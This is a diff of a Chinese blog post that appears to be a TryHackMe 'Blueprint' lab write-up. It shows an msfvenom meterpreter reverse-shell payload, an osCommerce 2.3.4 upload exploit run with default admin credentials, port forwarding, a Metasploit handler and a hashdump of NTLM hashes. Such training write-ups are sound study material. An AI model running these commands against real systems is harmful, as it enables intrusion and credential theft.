+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BLUEPRINT<span class="variable">$</span>@BLUEPRINT: C:\xampp\htdocs\oscommerce<span class="literal">-2</span>.<span class="number">3.4</span>\catalog\admin <span class="comment"># whoami</span></span><br><span class="line"> nt authority\system</span><br><span class="line"></span><br><span class="line">BLUEPRINT<span class="variable">$</span>@BLUEPRINT: C:\xampp\htdocs\oscommerce<span class="literal">-2</span>.<span class="number">3.4</span>\catalog\admin <span class="comment"># cd C:\Users\Administrator\Desktop</span></span><br><span class="line"></span><br><span class="line">BLUEPRINT<span class="variable">$</span>@BLUEPRINT:C:\Users\Administrator\Desktop<span class="comment"># dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is <span class="number">14</span>AF<span class="literal">-C52C</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>/<span class="number">27</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">15</span> PM    &lt;<span class="built_in">DIR</span>&gt;          .</span><br><span class="line"><span class="number">11</span>/<span class="number">27</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">15</span> PM    &lt;<span class="built_in">DIR</span>&gt;          ..</span><br><span class="line"><span class="number">11</span>/<span class="number">27</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">15</span> PM                <span class="number">37</span> root.txt.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">37</span> bytes</span><br><span class="line">               <span class="number">2</span> <span class="built_in">Dir</span>(s)  <span class="number">19</span>,<span class="number">505</span>,<span class="number">848</span>,<span class="number">320</span> bytes free</span><br><span class="line"></span><br><span class="line">BLUEPRINT<span class="variable">$</span>@BLUEPRINT:C:\Users\Administrator\Desktop <span class="comment"># type root.txt.txt</span></span><br><span class="line">THM&#123;aea1e3ce6fe7f89e10cea833ae009bee&#125;</span><br></pre></td></tr></table></figure>
 
-BLUEPRINT$@BLUEPRINT: C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin # cd C:\Users\Administrator\Desktop
-
-
-BLUEPRINT$@BLUEPRINT:C:\Users\Administrator\Desktop# dir
- Volume in drive C has no label.
- Volume Serial Number is 14AF-C52C
-
- Directory of C:\Users\Administrator\Desktop
-
-11&#x2F;27&#x2F;2019  07:15 PM    &lt;DIR&gt;          .
-11&#x2F;27&#x2F;2019  07:15 PM    &lt;DIR&gt;          ..
-11&#x2F;27&#x2F;2019  07:15 PM                37 root.txt.txt
-               1 File(s)             37 bytes
-               2 Dir(s)  19,505,848,320 bytes free
-
-BLUEPRINT$@BLUEPRINT: C:\Users\Administrator\Desktop #type root.txt.txt
-THM&#123;aea1e3ce6fe7f89e10cea833ae009bee&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>第一个题目要求我们获取 <code>lab</code> 用户的 <code>NTML hash</code> 值并解密</p>
-<p><code>msf</code> 里面有一个 <code>hashdump</code>命令 可以获取该值</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="获取-NTLM-Hash"><a href="#获取-NTLM-Hash" class="headerlink" title="获取 NTLM Hash"></a>获取 NTLM Hash</h3><p>第一个题目要求我们获取 <code>lab</code> 用户的 <code>NTLM hash</code> 值并解密</p>
+<p><code>msf</code> 里面有一个 <code>hashdump</code> 命令可以获取该值</p>
 <p>先用 <code>msfvenom</code> 生成反弹 <code>payload</code>，然后用 <code>43191.py</code> 将 <code>shell.exe</code> 上传</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>
-└─<span class="token comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.140.133 LPORT=4444 -f exe > shell.exe</span>
-<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: <span class="token number">354</span> bytes
-Final size of exe file: <span class="token number">7168</span> bytes
-                                                                                                                                
-┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>
-└─<span class="token comment"># python2 43191.py -u http://10.144.148.185:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.exe</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Authentication successful
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully prepared the exploit and created a new newsletter with nID <span class="token number">2</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully locked the newsletter. Now attempting to upload<span class="token punctuation">..</span>
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Now trying to verify that the <span class="token function">file</span> shell.exe uploaded<span class="token punctuation">..</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got a HTTP <span class="token number">200</span> Reply <span class="token keyword">for</span> the uploaded file<span class="token operator">!</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The uploaded <span class="token function">file</span> should now be available at http://10.144.148.185:8080/oscommerce-2.3.4/catalog/admin/shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.140.133 LPORT=4444 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 
-<p>我这里比较特殊，我是 <code>win11</code> 用 <code>openvpn</code> 连接的靶场，所以 <code>kali</code> 虚拟机能访问靶场地址，但是无法接受靶场的反弹，因此需要进行端口转发</p>
-<pre class="line-numbers language-none"><code class="language-none">netsh interface portproxy add v4tov4 listenport&#x3D;4444 listenaddress&#x3D;0.0.0.0 connectport&#x3D;4444 connectaddress&#x3D;192.168.80.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 43191.py -u http://10.144.148.185:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.exe</span><br></pre></td></tr></table></figure>
 
-<p>进入 <code>msfconsole</code>，使用 <code>exploit/multi/handler</code> 模块，设置 <code>port</code> 以及 <code>ip</code>，然后 <code>run</code> 开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Authentication successful</span><br><span class="line">[+] Successfully prepared the exploit and created a new newsletter with nID 2</span><br><span class="line">[+] Successfully locked the newsletter. Now attempting to upload..</span><br><span class="line">[*] Now trying to verify that the file shell.exe uploaded..</span><br><span class="line">[+] Got a HTTP 200 Reply for the uploaded file!</span><br><span class="line">[+] The uploaded file should now be available at http://10.144.148.185:8080/oscommerce-2.3.4/catalog/admin/shell.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>我这里比较特殊，我是 <code>win11</code> 用 <code>openvpn</code> 连接的靶场，所以 <code>kali</code> 虚拟机能访问靶场地址，但是无法接受靶场的反弹，因此需要进行端口转发</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">4444</span> listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> connectport=<span class="number">4444</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Metasploit-监听"><a href="#Metasploit-监听" class="headerlink" title="Metasploit 监听"></a>Metasploit 监听</h3><p>进入 <code>msfconsole</code>，使用 <code>exploit/multi/handler</code> 模块，设置 <code>port</code> 以及 <code>ip</code>，然后 <code>run</code> 开启监听</p>
 <p>再去之前的 <code>shell</code> 处运行 <code>shell.exe</code></p>
-<p><code>BLUEPRINT$@BLUEPRINT:C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin# shell.exe</code></p>
-<p>成功反弹，执行 hashdump 获取Lab 用户的哈希值</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
-└─<span class="token comment"># msfconsole</span>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BLUEPRINT<span class="variable">$</span>@BLUEPRINT:C:\xampp\htdocs\oscommerce<span class="literal">-2</span>.<span class="number">3.4</span>\catalog\admin<span class="comment"># shell.exe</span></span><br></pre></td></tr></table></figure>
 
-msf <span class="token operator">></span> use exploit/multi/handler
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp
-msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
-msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>
-LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4444</span>
-msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.80.128
-LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.80.128
-msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.80.128:4444 
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">199238</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.80.1
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">199238</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.80.1
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.80.128:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.80.1:4321<span class="token punctuation">)</span> at <span class="token number">2026</span>-05-12 <span class="token number">19</span>:01:11 +0800
-meterpreter <span class="token operator">></span> hashdump
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功反弹，执行 hashdump 获取 Lab 用户的哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.80.128</span><br><span class="line">LHOST =&gt; 192.168.80.128</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.128:4444 </span><br><span class="line">[*] Sending stage (199238 bytes) to 192.168.80.1</span><br><span class="line">[*] Sending stage (199238 bytes) to 192.168.80.1</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.128:4444 -&gt; 192.168.80.1:4321) at 2026-05-12 19:01:11 +0800</span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::</span><br></pre></td></tr></table></figure>
 
-<p>在 <a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> 网站进行解密</p>
-<p><img src="/../image/TryHackMe/easy/Blueprint/Hashes.png" alt="Hashes"></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Blueprint.html">https://x9wd09ncc.github.io/post/TryHackMe_Blueprint.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/oscommerce/">oscommerce</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_VulnNet_Internal.html" title="TryHackMe_VulnNet:Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_VulnNet:Internal</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Creative.html" title="TryHackMe_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Creative</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent T</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_tomghost"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_tomghost</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break Out The Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break Out The Cage</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
+<h3 id="解密-Hash"><a href="#解密-Hash" class="headerlink" title="解密 Hash"></a>解密 Hash</h3><p>在 <a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> 网站进行解密</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/Hashes.png" alt="Hash 解密结果"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>osCommerce 2.3.4 漏洞利用</li>
+<li>文件上传漏洞</li>
+<li>Metasploit hashdump 获取 NTLM Hash</li>
+<li>端口转发技巧</li>
+</ul>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43191">osCommerce 2.3.4 漏洞利用</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Blueprint.html">https://x9wd09ncc.github.io/post/TryHackMe_Blueprint.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/oscommerce/">oscommerce</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_VulnNet_Internal.html" title="TryHackMe_VulnNet_Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_VulnNet_Internal</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Creative.html" title="TryHackMe_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Creative</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break_Out_The_Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break_Out_The_Cage</div></div></a></div><div><a href="/post/TryHackMe_Bounty_Hacker.html" title="TryHackMe_Bounty_Hacker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Bounty_Hacker</div></div></a></div><div><a href="/post/TryHackMe_Brute_It.html" title="TryHackMe_Brute_It"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-17</div><div class="title">TryHackMe_Brute_It</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Blueprint"><span class="toc-number">1.</span> <span class="toc-text">Blueprint</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2"><span class="toc-number">1.1.3.</span> <span class="toc-text">漏洞搜索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-osCommerce"><span class="toc-number">1.2.1.</span> <span class="toc-text">安装 osCommerce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%8E%B7%E5%8F%96-Shell"><span class="toc-number">1.2.2.</span> <span class="toc-text">文件上传获取 Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-NTLM-Hash"><span class="toc-number">1.3.1.</span> <span class="toc-text">获取 NTLM Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-%E7%9B%91%E5%90%AC"><span class="toc-number">1.3.3.</span> <span class="toc-text">Metasploit 监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86-Hash"><span class="toc-number">1.3.4.</span> <span class="toc-text">解密 Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.4.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
